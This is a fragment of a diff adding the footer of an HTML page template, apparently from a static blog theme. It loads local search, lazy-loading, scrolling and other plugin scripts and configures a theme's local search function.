+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
